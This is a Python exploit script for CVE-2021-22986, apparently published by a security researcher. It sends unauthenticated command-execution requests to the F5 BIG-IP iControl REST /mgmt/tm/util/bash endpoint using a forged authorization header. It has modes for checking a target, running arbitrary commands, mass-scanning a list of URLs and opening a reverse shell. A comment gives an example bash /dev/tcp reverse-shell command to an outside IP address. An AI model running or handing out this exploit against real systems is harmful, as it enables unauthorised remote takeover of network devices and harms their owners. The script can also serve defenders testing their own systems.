import requests
import json
import sys
import argparse
import re
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

t = int(time.time())

def title():
    print('''
      ______ ____    ____  _______       ___     ___    ___    __        ___    ___     ___     ___      __   
     /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  /_ |      |__ \  |__ \   / _ \   / _ \    / /   
    |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) |  | |  ______ ) |    ) | | (_) | | (_) |  / /_   
    |  |       \      /   |   __|  |______/ /  | | | |   / /   | | |______/ /    / /   \__, |  > _ <  | '_ \  
    |  `----.   \    /    |  |____       / /_  | |_| |  / /_   | |       / /_   / /_     / /  | (_) | | (_) | 
     \______|    \__/     |_______|     |____|  \___/  |____|  |_|      |____| |____|   /_/    \___/   \___/                                                                                                                                                                             
    
                                Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex
    ''')
    print('''
        验证模式：python CVE_2021_22986.py -v true -u target_url 
        攻击模式：python CVE_2021_22986.py -a true -u target_url -c command 
        批量检测：python CVE_2021_22986.py -s true -f file
        反弹模式：python CVE_2021_22986.py -r true -u target_url -c command 
        ''')

def check(target_url):
    check_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }
    data = {'command': "run",'utilCmdArgs':"-c id"}
    try:
        response = requests.post(url=check_url, json=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            print("[+] 目标 {} 存在漏洞".format(target_url))
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))

def attack(target_url,cmd):
    attack_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }

    data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(cmd)}
    try:
        response = requests.post(url=attack_url, json=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            print("[+] 目标 {} 存在漏洞".format(target_url))
            print('[+] 响应为:{0}'.format(display))
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))  
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))

def reverse_shell(target_url,command):
    reverse_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }

    data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command)}
    # command: bash -i >&/dev/tcp/192.168.174.129/8888 0>&1
    try:
        requests.post(url=reverse_url, json=data, headers=headers, verify=False, timeout=5)
    except Exception as e:
        print("[+] 请自行查看是否反弹shell回来")

def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip())
                check(url_path)

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))


def main():
    parser = argparse.ArgumentParser("F5 Big-IP RCE")
    parser.add_argument('-v', '--verify', type=bool,help=' 验证模式 ')
    parser.add_argument('-u', '--url', type=str, help=' 目标URL ')

    parser.add_argument('-a', '--attack', type=bool, help=' 攻击模式 ')
    parser.add_argument('-c', '--command', type=str, default="id", help=' 执行命令 ')

    parser.add_argument('-s', '--scan', type=bool, help=' 批量模式 ')
    parser.add_argument('-f', '--file', type=str, help=' 文件路径 ')


    parser.add_argument('-r', '--shell', type=bool, help=' 反弹shell模式 ')
    args = parser.parse_args()

    verify_model = args.verify
    url = args.url

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    shell_model = args.shell


    if verify_model is True and url !=None:
        check(url)
    elif attack_model is True and url != None and command != None:
        attack(url,command)
    elif scan_model is True and file != None:
        scan(file)
    elif shell_model is True and url != None and command != None:
        reverse_shell(url,command)
    else:
        sys.exit(0)     

if __name__ == '__main__':
    title()
    main()